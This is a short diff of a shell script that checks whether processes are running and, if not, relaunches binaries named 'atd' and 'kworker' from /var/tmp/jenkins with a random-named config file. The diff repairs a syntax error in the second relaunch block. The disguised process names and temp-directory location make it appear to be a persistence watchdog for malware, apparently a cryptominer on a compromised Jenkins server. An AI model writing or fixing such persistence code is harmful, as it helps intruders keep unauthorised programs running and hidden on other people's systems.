@@ -7,6 +7,6 @@ if [ $count -lt 1 ]; then
 cd /var/tmp/jenkins && ./atd -c honvbsasbf.conf -t $thread -B
 fi
 doublecount=$(ps -ef | grep -v grep | grep atd | grep conf| wc -l)
-if [ $doublecount -lt 1 ]
+if [ $doublecount -lt 1 ]; then
 cd /var/tmp/jenkins && ./kworker -c config.json -B
 fi
